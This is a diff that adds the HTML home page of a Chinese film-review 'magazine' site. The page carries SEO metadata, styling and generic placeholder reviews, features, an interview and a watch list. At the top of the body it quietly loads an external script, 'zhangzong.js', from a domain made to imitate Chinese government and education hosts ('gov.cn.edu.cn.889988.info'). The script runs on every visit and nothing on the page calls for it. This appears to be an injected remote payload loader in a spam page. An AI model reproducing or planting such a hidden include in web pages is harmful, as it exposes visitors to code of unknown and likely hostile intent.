@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>5555电影网 · 一份写给影迷的双周影像评论志</title>
+<meta name="description" content="5555电影网以杂志编辑部的视角记录当下影像：深度影评、导演访谈、类型片考古、院线与流媒体排片观察，以及一份持续更新的私人观影备忘录。我们不追逐热搜，只讨论值得被记住的画面。">
+<meta name="keywords" content="5555电影网,影像评论,深度影评,导演访谈,类型片,电影杂志,观影备忘录,院线观察,流媒体片单,影迷文化">
+<meta name="author" content="5555电影网编辑部">
+<meta name="robots" content="index,follow">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="revisit-after" content="10 days">
+<meta property="og:site_name" content="5555电影网">
+<meta property="og:title" content="5555电影网 · 一份写给影迷的双周影像评论志">
+<meta property="og:description" content="深度影评、导演访谈、类型片考古与院线观察，一份持续更新的影像评论志。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://5555dianyingwang-zh.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://5555dianyingwang-zh.github.io">
+<style>
+:root{
+  --paper:#f4f1ea;--ink:#1c1c1c;--red:#d83a2f;--navy:#20344a;--gold:#a8823c;--ln:#d8d2c6;--mute:#6b655c;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Georgia","Songti SC","SimSun","Source Han Serif SC",serif;background:var(--paper);color:var(--ink);line-height:1.85;font-size:15.5px;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;background:repeating-linear-gradient(0deg,rgba(0,0,0,.012) 0 1px,transparent 1px 4px)}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1120px;margin:0 auto;padding:0 24px}
+.sans{font-family:"Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif}
+
+/* 报头 */
+.mast{background:var(--ink);color:#f4f1ea;border-bottom:5px double var(--red);padding:26px 0 20px}
+.mast .in{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap}
+.mast .date{font-size:11.5px;letter-spacing:3px;color:#c9c2b6;margin-bottom:8px}
+.mast h1{font-size:58px;font-weight:900;letter-spacing:4px;line-height:1}
+.mast h1 span{color:var(--red)}
+.mast .sub{font-size:12px;letter-spacing:6px;color:#c9c2b6;margin-top:10px;text-transform:uppercase}
+.mast .meta{text-align:right;font-size:12px;color:#c9c2b6;border-left:1px solid #444;padding-left:18px}
+.mast .meta b{display:block;color:#fff;font-size:13px;margin-bottom:4px}
+
+/* 导航 */
+nav.cat{background:#fff;border-bottom:1px solid var(--ln);position:sticky;top:0;z-index:50}
+nav.cat .in{max-width:1120px;margin:0 auto;padding:0 24px;display:flex;gap:2px;overflow-x:auto}
+nav.cat a{padding:13px 16px;font-size:13px;letter-spacing:1px;color:var(--mute);white-space:nowrap;border-bottom:2px solid transparent}
+nav.cat a:hover{color:var(--red);border-bottom-color:var(--red)}
+nav.cat a.on{color:var(--ink);font-weight:700;border-bottom-color:var(--red)}
+
+/* 头版头条 */
+.headline{padding:46px 0 8px}
+.hl{display:grid;grid-template-columns:1.6fr 1fr;gap:34px;padding-bottom:34px;border-bottom:1px solid var(--ln)}
+.hl .kicker{font-size:11px;letter-spacing:4px;color:var(--red);text-transform:uppercase;margin-bottom:12px}
+.hl h2{font-size:40px;font-weight:900;line-height:1.22;margin-bottom:16px;letter-spacing:.5px}
+.hl .by{font-size:12px;color:var(--mute);font-style:italic;margin-bottom:16px}
+.hl p{font-size:16.5px;line-height:1.95;color:#333}
+.hl p::first-letter{font-size:48px;float:left;line-height:.9;padding:6px 10px 0 0;color:var(--red);font-weight:900}
+.side{border-left:1px solid var(--ln);padding-left:34px}
+.side .box{border:1px solid var(--ln);background:#fff;padding:20px 22px;margin-bottom:20px}
+.side .box h4{font-size:12px;letter-spacing:3px;color:var(--red);margin-bottom:12px;text-transform:uppercase;border-bottom:1px solid var(--ln);padding-bottom:8px}
+.side li{padding:10px 0;border-bottom:1px dotted var(--ln);font-size:14.5px;display:flex;gap:10px}
+.side li:last-child{border-bottom:none}
+.side li i{flex-shrink:0;width:24px;height:24px;border-radius:50%;background:var(--ink);color:#fff;font-size:11px;display:grid;place-items:center;font-style:normal;font-family:"Helvetica Neue",sans-serif}
+.side li b{display:block;font-size:11.5px;color:var(--mute);font-weight:400}
+
+/* 栏目标题 */
+.blk{padding:52px 0}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:30px;border-bottom:3px double var(--red);padding-bottom:10px}
+.sec-head h3{font-size:26px;font-weight:900;letter-spacing:1px}
+.sec-head em{font-style:normal;color:var(--red)}
+.sec-head span{font-size:11px;letter-spacing:3px;color:var(--mute);text-transform:uppercase}
+.sec-head a{margin-left:auto;font-size:12.5px;color:var(--navy);font-family:"Helvetica Neue",sans-serif}
+
+/* 影评双栏 */
+.reviews{display:grid;grid-template-columns:1fr 1fr;gap:34px}
+.art{border-bottom:1px solid var(--ln);padding-bottom:26px;margin-bottom:26px}
+.art:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0}
+.art .cat-tag{font-size:11px;letter-spacing:2px;color:var(--red);text-transform:uppercase}
+.art h4{font-size:21px;font-weight:700;line-height:1.4;margin:8px 0 10px}
+.art .info{font-size:12px;color:var(--mute);font-style:italic;margin-bottom:12px}
+.art p{font-size:15px;color:#333}
+.art .more{display:inline-block;margin-top:12px;font-size:12.5px;color:var(--navy);font-family:"Helvetica Neue",sans-serif;border-bottom:1px solid var(--navy)}
+
+/* 类型片考古 大图 */
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:24px}
+.issue{background:#fff;border:1px solid var(--ln);padding:0 0 20px}
+.issue .frame{height:150px;background:var(--navy);position:relative;overflow:hidden;display:grid;place-items:center;color:#fff}
+.issue .frame::after{content:"";position:absolute;inset:0;background:linear-gradient(135deg,transparent 0 60%,rgba(216,58,47,.55))}
+.issue .frame b{font-size:34px;font-weight:900;letter-spacing:2px;position:relative;z-index:1}
+.issue .frame small{position:absolute;bottom:10px;right:14px;font-size:11px;letter-spacing:2px;z-index:1;color:#e8e3d9}
+.issue .pad{padding:18px 20px 0}
+.issue .num{font-size:11px;color:var(--red);letter-spacing:2px;font-family:"Helvetica Neue",sans-serif}
+.issue h5{font-size:17.5px;margin:6px 0 9px;line-height:1.4}
+.issue p{font-size:14px;color:#444}
+
+/* 排片观察 表格 */
+.schedule{background:#fff;border:1px solid var(--ln);overflow-x:auto}
+.schedule table{width:100%;border-collapse:collapse;font-size:14.5px;min-width:620px}
+.schedule th{background:var(--ink);color:#fff;padding:12px 16px;text-align:left;font-size:12px;letter-spacing:2px}
+.schedule td{padding:13px 16px;border-bottom:1px solid var(--ln)}
+.schedule tr:nth-child(even) td{background:#faf8f3}
+.schedule .star{color:var(--gold);letter-spacing:1px;font-size:13px}
+
+/* 访谈 引用块 */
+.qa{display:grid;gap:22px}
+.qa .row{background:#fff;border:1px solid var(--ln);border-left:4px solid var(--red);padding:22px 26px}
+.qa .q{font-size:12px;letter-spacing:3px;color:var(--red);margin-bottom:8px;font-family:"Helvetica Neue",sans-serif}
+.qa p{font-size:15.5px;color:#333}
+.qa .who{display:block;margin-top:12px;font-size:12.5px;color:var(--mute);font-style:italic;text-align:right}
+
+/* 备忘录 手账风 */
+.memo{background:#fffdf7;border:1px dashed var(--gold);padding:30px}
+.memo ul{columns:2;column-gap:40px}
+.memo li{break-inside:avoid;padding:9px 0 9px 26px;position:relative;border-bottom:1px dotted var(--ln);font-size:14.5px}
+.memo li::before{content:"✦";position:absolute;left:0;top:9px;color:var(--gold);font-size:11px}
+.memo li b{color:var(--red);font-weight:700}
+
+/* 页脚 */
+footer{background:var(--ink);color:#c9c2b6;padding:50px 0 0;margin-top:40px}
+.f{max-width:1120px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:34px;padding-bottom:34px}
+.f h6{color:#fff;font-size:12px;letter-spacing:3px;margin-bottom:16px;text-transform:uppercase}
+.f p,.f li{font-size:13.5px;line-height:1.9}
+.f li a:hover{color:var(--red)}
+.f .site h5{font-size:30px;font-weight:900;color:#fff;letter-spacing:2px}
+.f .site h5 span{color:var(--red)}
+.f .site p{margin:10px 0 18px}
+.domain{background:rgba(216,58,47,.12);border:1px solid rgba(216,58,47,.4);padding:14px;text-align:center}
+.domain b{display:block;font-size:10px;letter-spacing:4px;color:#8f8a80;margin-bottom:6px}
+.domain a{color:#f4a79f;font-family:"Helvetica Neue",sans-serif;font-size:14px;word-break:break-all}
+.colo{max-width:1120px;margin:0 auto;padding:20px 24px;border-top:1px solid #3a3a3a;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;font-size:12px}
+.colo a{color:#8f8a80}
+
+@media(max-width:860px){
+  .mast h1{font-size:38px}
+  .hl{grid-template-columns:1fr;gap:24px}.side{border-left:none;padding-left:0;border-top:1px solid var(--ln);padding-top:24px}
+  .hl h2{font-size:30px}
+  .reviews{grid-template-columns:1fr}
+  .grid3{grid-template-columns:1fr}
+  .memo ul{columns:1}
+  .f{grid-template-columns:1fr 1fr}
+}
+@media(max-width:480px){
+  .wrap,.f,.colo{padding-left:15px;padding-right:15px}
+  .mast .in{align-items:flex-start}.mast .meta{text-align:left;border-left:none;padding-left:0;border-top:1px solid #444;padding-top:10px;width:100%}
+  .mast h1{font-size:30px}
+  .f{grid-template-columns:1fr}
+  .hl p::first-letter{font-size:38px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="mast">
+  <div class="wrap in">
+    <div>
+      <div class="date sans">VOL. 055 · 第 55 期 · 影像评论志</div>
+      <h1 class="sans">5555<span>电影网</span></h1>
+      <div class="sub sans">A Fortnightly Journal of Cinema</div>
+    </div>
+    <div class="meta sans">
+      <b>编辑部 · 在线版</b>
+      双周更新 · 院线与流媒体排片观察<br>
+      深度影评 · 导演访谈 · 类型片考古<br>
+      一份写给认真看片的人
+    </div>
+  </div>
+</header>
+
+<nav class="cat">
+  <div class="in">
+    <a href="#headline" class="on">本期头版</a>
+    <a href="#review">影像评论</a>
+    <a href="#genre">类型考古</a>
+    <a href="#schedule">排片观察</a>
+    <a href="#interview">人物访谈</a>
+    <a href="#memo">观影备忘录</a>
+    <a href="#about">关于编辑部</a>
+  </div>
+</nav>
+
+<!-- 头版头条 -->
+<section class="wrap headline" id="headline">
+  <div class="hl">
+    <div>
+      <div class="kicker sans">Editor's Letter · 卷首语</div>
+      <h2>当一部电影不再被谈论，<br>它还剩下什么？</h2>
+      <div class="by sans">— 本期卷首 · 值班编辑</div>
+      <p>我们正处在影像最丰盛、也最容易被遗忘的年代。一部作品在热搜上停留三天，在算法里存活两周，然后便沉入无人回看的列表深处。本期我们决定换一个问法：不被谈论的电影，是否就失去了价值？从院线到独立影展，从大师回顾到冷门类型，我们记录那些值得被再看一遍的画面，以及它们留下的问题。</p>
+    </div>
+    <aside class="side sans">
+      <div class="box">
+        <h4>本期目录 Contents</h4>
+        <ul>
+          <li><i>01</i>卷首语：当一部电影不再被谈论<b>编辑部</b></li>
+          <li><i>02</i>影像评论：五篇近期院线片长评<b>本期重点</b></li>
+          <li><i>03</i>类型考古：被低估的犯罪片第三幕<b>专题</b></li>
+          <li><i>04</i>排片观察：双周院线与流媒体清单<b>实用</b></li>
+          <li><i>05</i>人物访谈：对话新锐短片导演<b>独家</b></li>
+          <li><i>06</i>观影备忘录：编辑部私藏片单<b>共 24 部</b></li>
+        </ul>
+      </div>
+      <div class="box">
+        <h4>编辑部手记</h4>
+        <p style="font-size:14px;color:#444;font-style:italic">"我们不评好坏，只讨论它为什么这样拍，以及它让你想起了什么。"</p>
+      </div>
+    </aside>
+  </div>
+</section>
+
+<!-- 栏目1 影像评论 -->
+<section class="blk wrap" id="review">
+  <div class="sec-head"><span>01</span><h3>影像<em>评论</em></h3><span>Film Criticism</span><a href="#">全部评论 ›</a></div>
+  <div class="reviews">
+    <div class="art">
+      <div class="cat-tag sans">院线片 · 长评</div>
+      <h4>在慢下来的那三分钟里，角色才真正开口说话</h4>
+      <div class="info sans">文 / 评论组 · 发表于本期 · 约 1800 字</div>
+      <p>一部并不急着推进剧情的作品，靠的是节奏上的耐心。当所有人都在加快剪辑，它选择把镜头停在一个人点烟、起身、看窗外的连续动作上——这三分钟成了全片最诚实的部分。</p>
+      <a href="#" class="more sans">阅读全文</a>
+    </div>
+    <div class="art">
+      <div class="cat-tag sans">独立电影</div>
+      <h4>低预算不等于低想象力：三部长片的结构巧思</h4>
+      <div class="info sans">文 / 评论组 · 发表于本期 · 约 1500 字</div>
+      <p>成本限制反而逼出了叙事上的机灵。三位导演分别用单一场景、伪纪录片视角和逆向时间线，完成了比大制作更让人记得住的尝试。</p>
+      <a href="#" class="more sans">阅读全文</a>
+    </div>
+    <div class="art">
+      <div class="cat-tag sans">影史重看</div>
+      <h4>二十年后重看：它预言了我们的观看方式</h4>
+      <div class="info sans">文 / 评论组 · 发表于本期 · 约 1600 字</div>
+      <p>一部当年被视为"过于冷"的作品，在今天的流媒体时代反而显出新意——它对注意力、对凝视、对屏幕与人的关系，早有冷静的观察。</p>
+      <a href="#" class="more sans">阅读全文</a>
+    </div>
+    <div class="art">
+      <div class="cat-tag sans">短片与纪录片</div>
+      <h4>二十二分钟的纪录片，为什么比剧情片更难拍</h4>
+      <div class="info sans">文 / 评论组 · 发表于本期 · 约 1200 字</div>
+      <p>纪录片没有剧本兜底，剪辑决定一切。本期我们拆解一部短片的取舍逻辑：哪些素材被留下，哪些被忍痛删掉，以及删掉的部分去哪了。</p>
+      <a href="#" class="more sans">阅读全文</a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2 类型考古 -->
+<section class="blk wrap" id="genre" style="background:#faf8f3">
+  <div class="sec-head"><span>02</span><h3>类型<em>考古</em></h3><span>Genre Archaeology</span><a href="#">专题归档 ›</a></div>
+  <div class="grid3">
+    <article class="issue">
+      <div class="frame"><b>犯罪</b><small>CRIME</small></div>
+      <div class="pad"><div class="num sans">专题 01</div><h5>被低估的犯罪片第三幕</h5><p>从背叛如何被安排，到结尾的留白技巧，我们回看近二十年犯罪类型里最不俗套的收尾方式。</p></div>
+    </article>
+    <article class="issue">
+      <div class="frame" style="background:var(--gold)"><b>家庭</b><small>FAMILY</small></div>
+      <div class="pad"><div class="num sans">专题 02</div><h5>餐桌戏：家庭关系最真实的战场</h5><p>一顿饭能交代多少信息？我们用十二个经典片段说明，为什么"坐下吃饭"是全片最难拍的一场戏。</p></div>
+    </article>
+    <article class="issue">
+      <div class="frame" style="background:var(--red)"><b>科幻</b><small>SCI-FI</small></div>
+      <div class="pad"><div class="num sans">专题 03</div><h5>世界观交代：从台词到道具的距离</h5><p>优秀科幻片不靠旁白解释。我们梳理那些把设定藏在服装、道具、背景里的做法，以及失败的对照。</p></div>
+    </article>
+  </div>
+</section>
+
+<!-- 栏目3 排片观察 -->
+<section class="blk wrap" id="schedule">
+  <div class="sec-head"><span>03</span><h3>排片<em>观察</em></h3><span>What to Watch</span><a href="#">订阅排片邮件 ›</a></div>
+  <div class="schedule sans">
+    <table>
+      <thead><tr><th>本周推荐</th><th>类型</th><th>片长</th><th>看点</th><th>推荐度</th></tr></thead>
+      <tbody>
+        <tr><td>《本期主打长片》</td><td>剧情 / 家庭</td><td>128 分钟</td><td>表演细腻，节奏克制</td><td class="star">★★★★☆</td></tr>
+        <tr><td>《独立影展入选短片集》</td><td>短片合集</td><td>96 分钟</td><td>新人导演集中亮相</td><td class="star">★★★★★</td></tr>
+        <tr><td>《冷门修复版老片》</td><td>经典修复</td><td>112 分钟</td><td>4K 重制，画质焕新</td><td class="star">★★★★☆</td></tr>
+        <tr><td>《纪录片新作》</td><td>纪录</td><td>104 分钟</td><td>题材少见，剪辑扎实</td><td class="star">★★★★☆</td></tr>
+        <tr><td>《流媒体上线新片》</td><td>悬疑 / 犯罪</td><td>119 分钟</td><td>适合周末连看</td><td class="star">★★★☆☆</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- 栏目4 人物访谈 -->
+<section class="blk wrap" id="interview" style="background:#faf8f3">
+  <div class="sec-head"><span>04</span><h3>人物<em>访谈</em></h3><span>Conversation</span><a href="#">往期访谈 ›</a></div>
+  <div class="qa sans">
+    <div class="row"><div class="q">Q1 · 关于创作起点</div><p>"我拍第一部短片的时候没有任何预算，只能靠朋友借的设备和周末的时间。那反而让我学会了在限制里做决定——哪些镜头是必须拍的，哪些念头只是自我感动。"<span class="who">— 新锐短片导演</span></p></div>
+    <div class="row"><div class="q">Q2 · 关于观众</div><p>"我不担心观众看不懂，我担心的是观众没被邀请进来。所以每一场戏我都会问自己：现在这个画面，是我在表达，还是我在跟谁说话？"<span class="who">— 新锐短片导演</span></p></div>
+    <div class="row"><div class="q">Q3 · 关于未来</div><p>"想尝试更长的篇幅，但又不希望丢掉短片时期那种紧凑。或许下一个作品会是一部长片，结构上却像几个短片被同一件事串起来。"<span class="who">— 新锐短片导演</span></p></div>
+  </div>
+</section>
+
+<!-- 栏目5 观影备忘录 -->
+<section class="blk wrap" id="memo">
+  <div class="sec-head"><span>05</span><h3>观影<em>备忘录</em></h3><span>Memo</span><a href="#">提交你的推荐 ›</a></div>
+  <div class="memo sans">
+    <ul>
+      <li><b>本周必看：</b>《本期主打长片》——把耐心还给观众的一部作品。</li>
+      <li><b>经典重温：</b>《冷门修复版老片》——4K 修复后第一次在大银幕看。</li>
+      <li><b>短片时间：</b>独立影展入选短片集，适合一次看完。</li>
+      <li><b>纪录片补完：</b>《纪录片新作》，题材罕见，值得做笔记。</li>
+      <li><b>周末连看：</b>《流媒体上线新片》，悬疑线收得干净。</li>
+      <li><b>影史补票：</b>三部当年冷门、如今被重估的旧作。</li>
+      <li><b>新手入门：</b>犯罪片第三幕专题里的三部入门片。</li>
+      <li><b>进阶选片：</b>餐桌戏专题延伸的十二个片段来源片单。</li>
+      <li><b>冷门推荐：</b>一部只在小范围放映过的纪录片长片。</li>
+      <li><b>导演补课：</b>本期访谈导演的前两部短片作品。</li>
+      <li><b>类型尝鲜：</b>科幻世界观交代做得最好的五部作品。</li>
+      <li><b>睡前短篇：</b>四部节奏缓慢、适合安静看的作品。</li>
+    </ul>
+  </div>
+</section>
+
+<!-- 栏目6 关于 -->
+<section class="blk wrap" id="about" style="padding-top:0">
+  <div class="sec-head"><span>06</span><h3>关于<em>编辑部</em></h3><span>About</span></div>
+  <div class="reviews">
+    <div class="art">
+      <h4>我们是谁</h4>
+      <p>5555电影网是一个以杂志编辑部形式运作的影像评论站点。我们相信电影值得被认真讨论，也值得被温柔地记下来。这里没有榜单排名，没有热搜追逐，只有一份持续更新的、写给影迷的评论志。</p>
+      <a href="#" class="more sans">了解编辑团队</a>
+    </div>
+    <div class="art">
+      <h4>投稿与来信</h4>
+      <p>欢迎读者推荐影片、分享观影笔记，也欢迎影评人投稿长评。每期我们会挑选一封读者来信刊登在卷首之后，让评论这件事保持双向的对话感。</p>
+      <a href="#" class="more sans">写信给编辑部</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="f">
+    <div class="site">
+      <h5 class="sans">5555<span>电影网</span></h5>
+      <p>一份写给影迷的双周影像评论志。专注深度影评、导演访谈、类型片考古与排片观察，持续更新，欢迎订阅与来信。</p>
+      <div class="domain sans"><b>OFFICIAL SITE</b><a href="https://5555dianyingwang-zh.github.io">5555dianyingwang-zh.github.io</a></div>
+    </div>
+    <div>
+      <h6>固定栏目</h6>
+      <ul>
+        <li><a href="#review">影像评论</a></li>
+        <li><a href="#genre">类型考古</a></li>
+        <li><a href="#schedule">排片观察</a></li>
+        <li><a href="#interview">人物访谈</a></li>
+        <li><a href="#memo">观影备忘录</a></li>
+      </ul>
+    </div>
+    <div>
+      <h6>往期专题</h6>
+      <ul>
+        <li><a href="#">犯罪片第三幕</a></li>
+        <li><a href="#">餐桌戏研究</a></li>
+        <li><a href="#">科幻世界观</a></li>
+        <li><a href="#">纪录片剪辑</a></li>
+        <li><a href="#">短片创作谈</a></li>
+      </ul>
+    </div>
+    <div>
+      <h6>读者服务</h6>
+      <ul>
+        <li><a href="#">订阅排片邮件</a></li>
+        <li><a href="#">投稿与来信</a></li>
+        <li><a href="#">RSS 订阅</a></li>
+        <li><a href="#">版权与转载</a></li>
+        <li><a href="#">隐私说明</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="colo sans"><span>© 2026 5555电影网 · 5555dianyingwang-zh.github.io · 影像评论志</span><span><a href="#">返回顶部 ↑</a></span></div>
+</footer>
+</body>
+</html>
